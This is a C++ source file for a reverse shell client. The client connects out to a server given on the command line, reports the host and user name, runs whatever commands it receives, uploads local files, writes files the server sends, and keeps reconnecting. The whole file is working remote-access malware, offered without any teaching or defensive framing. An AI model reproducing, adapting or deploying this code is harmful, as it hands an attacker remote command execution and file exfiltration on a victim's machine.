#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>
#include <cstring>
#include <filesystem>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <process.h>
    #pragma comment(lib, "ws2_32.lib")
    #define close closesocket
    #define SOCKET_TYPE SOCKET
    #define INVALID_SOCKET_VALUE INVALID_SOCKET
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <sys/wait.h>
    #define SOCKET_TYPE int
    #define INVALID_SOCKET_VALUE -1
#endif

namespace fs = std::filesystem;

class ReverseShellClient {
private:
    std::string server_ip;
    int server_port;
    SOCKET_TYPE sock;
    bool connected;
    bool should_reconnect;

    bool initializeSocket() {
#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed" << std::endl;
            return false;
        }
#endif
        return true;
    }

    void cleanupSocket() {
#ifdef _WIN32
        WSACleanup();
#endif
    }

    bool connectToServer() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET_VALUE) {
            std::cerr << "Socket creation failed" << std::endl;
            return false;
        }

        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        
        if (inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr) <= 0) {
            std::cerr << "Invalid server IP address" << std::endl;
            close(sock);
            return false;
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "Connection to server failed" << std::endl;
            close(sock);
            return false;
        }

        connected = true;
        std::cout << "Connected to server " << server_ip << ":" << server_port << std::endl;
        
        // Send initial client info
        sendClientInfo();
        return true;
    }

    void sendClientInfo() {
        std::string client_info = "CLIENT_INFO:";
        
#ifdef _WIN32
        char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computer_name);
        if (GetComputerNameA(computer_name, &size)) {
            client_info += std::string(computer_name) + ":";
        } else {
            client_info += "Unknown:";
        }
        
        char username[UNLEN + 1];
        size = sizeof(username);
        if (GetUserNameA(username, &size)) {
            client_info += std::string(username) + ":";
        } else {
            client_info += "Unknown:";
        }
        client_info += "Windows";
#else
        client_info += std::string(getenv("HOSTNAME") ? getenv("HOSTNAME") : "Unknown") + ":";
        client_info += std::string(getenv("USER") ? getenv("USER") : "Unknown") + ":";
        client_info += "Linux";
#endif
        
        client_info += "\n";
        send(sock, client_info.c_str(), client_info.length(), 0);
    }

    std::string executeCommand(const std::string& command) {
        std::string result;
        
#ifdef _WIN32
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
            return "Error: Could not create pipe\n";
        }
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hWrite;
        si.hStdOutput = hWrite;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        std::string cmd = "cmd.exe /c " + command;
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(hWrite);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
            
            WaitForSingleObject(pi.hProcess, 5000); // 5 second timeout
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            result = "Error: Could not execute command\n";
        }
        CloseHandle(hRead);
#else
        FILE* pipe = popen(command.c_str(), "r");
        if (!pipe) {
            return "Error: Could not execute command\n";
        }
        
        char buffer[4096];
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
        pclose(pipe);
#endif
        
        if (result.empty()) {
            result = "Command executed successfully (no output)\n";
        }
        
        return result;
    }

    bool uploadFile(const std::string& filepath) {
        std::ifstream file(filepath, std::ios::binary);
        if (!file.is_open()) {
            std::string error = "ERROR:Could not open file: " + filepath + "\n";
            send(sock, error.c_str(), error.length(), 0);
            return false;
        }

        // Get file size
        file.seekg(0, std::ios::end);
        size_t file_size = file.tellg();
        file.seekg(0, std::ios::beg);

        // Send file header
        std::string header = "FILE_UPLOAD:" + fs::path(filepath).filename().string() + ":" + std::to_string(file_size) + "\n";
        send(sock, header.c_str(), header.length(), 0);

        // Send file data in chunks
        char buffer[4096];
        size_t total_sent = 0;
        while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0) {
            size_t bytes_read = file.gcount();
            ssize_t bytes_sent = send(sock, buffer, bytes_read, 0);
            if (bytes_sent <= 0) {
                file.close();
                return false;
            }
            total_sent += bytes_sent;
        }

        file.close();
        std::cout << "Uploaded file: " << filepath << " (" << total_sent << " bytes)" << std::endl;
        return true;
    }

    bool downloadFile(const std::string& filename, size_t file_size) {
        std::string filepath = filename;
        
        // Create downloads directory if it doesn't exist
        fs::create_directories("downloads");
        filepath = "downloads/" + filename;
        
        std::ofstream file(filepath, std::ios::binary);
        if (!file.is_open()) {
            std::string error = "ERROR:Could not create file: " + filepath + "\n";
            send(sock, error.c_str(), error.length(), 0);
            return false;
        }

        char buffer[4096];
        size_t total_received = 0;
        while (total_received < file_size) {
            size_t to_receive = std::min(sizeof(buffer), file_size - total_received);
            ssize_t bytes_received = recv(sock, buffer, to_receive, 0);
            if (bytes_received <= 0) {
                file.close();
                fs::remove(filepath);
                return false;
            }
            
            file.write(buffer, bytes_received);
            total_received += bytes_received;
        }

        file.close();
        std::cout << "Downloaded file: " << filepath << " (" << total_received << " bytes)" << std::endl;
        
        // Send confirmation
        std::string confirm = "DOWNLOAD_COMPLETE:" + filename + "\n";
        send(sock, confirm.c_str(), confirm.length(), 0);
        return true;
    }

    void handleServerMessages() {
        char buffer[4096];
        std::string incomplete_message;
        
        while (connected) {
            ssize_t bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                std::cerr << "Connection lost" << std::endl;
                connected = false;
                break;
            }
            
            buffer[bytes_received] = '\0';
            std::string message = incomplete_message + std::string(buffer);
            
            size_t pos = 0;
            while ((pos = message.find('\n')) != std::string::npos) {
                std::string command = message.substr(0, pos);
                message = message.substr(pos + 1);
                
                processCommand(command);
            }
            
            incomplete_message = message;
        }
    }

    void processCommand(const std::string& command) {
        if (command.empty()) return;
        
        std::cout << "Received command: " << command << std::endl;
        
        if (command.substr(0, 8) == "EXECUTE:") {
            std::string cmd = command.substr(8);
            std::string result = executeCommand(cmd);
            std::string response = "RESULT:" + result;
            send(sock, response.c_str(), response.length(), 0);
        }
        else if (command.substr(0, 7) == "UPLOAD:") {
            std::string filepath = command.substr(7);
            uploadFile(filepath);
        }
        else if (command.substr(0, 9) == "DOWNLOAD:") {
            // Format: DOWNLOAD:filename:size
            size_t colon_pos = command.find(':', 9);
            if (colon_pos != std::string::npos) {
                std::string filename = command.substr(9, colon_pos - 9);
                size_t file_size = std::stoull(command.substr(colon_pos + 1));
                downloadFile(filename, file_size);
            }
        }
        else if (command == "PING") {
            send(sock, "PONG\n", 5, 0);
        }
        else if (command == "DISCONNECT") {
            connected = false;
            should_reconnect = false;
        }
        else {
            std::string error = "ERROR:Unknown command: " + command + "\n";
            send(sock, error.c_str(), error.length(), 0);
        }
    }

public:
    ReverseShellClient(const std::string& ip, int port) 
        : server_ip(ip), server_port(port), sock(INVALID_SOCKET_VALUE), 
          connected(false), should_reconnect(true) {
        initializeSocket();
    }

    ~ReverseShellClient() {
        if (connected) {
            close(sock);
        }
        cleanupSocket();
    }

    void run() {
        while (should_reconnect) {
            if (!connected) {
                std::cout << "Attempting to connect to server..." << std::endl;
                if (connectToServer()) {
                    handleServerMessages();
                } else {
                    std::cout << "Connection failed, retrying in 10 seconds..." << std::endl;
                    std::this_thread::sleep_for(std::chrono::seconds(10));
                }
            }
            
            if (connected) {
                close(sock);
                connected = false;
            }
            
            if (should_reconnect) {
                std::cout << "Reconnecting in 5 seconds..." << std::endl;
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
        
        std::cout << "Client shutting down..." << std::endl;
    }
};

int main(int argc, char* argv[]) {
    std::string server_ip = "127.0.0.1";
    int server_port = 9999;
    
    if (argc >= 3) {
        server_ip = argv[1];
        server_port = std::stoi(argv[2]);
    }
    
    std::cout << "Starting reverse shell client..." << std::endl;
    std::cout << "Target server: " << server_ip << ":" << server_port << std::endl;
    
    ReverseShellClient client(server_ip, server_port);
    client.run();
    
    return 0;
}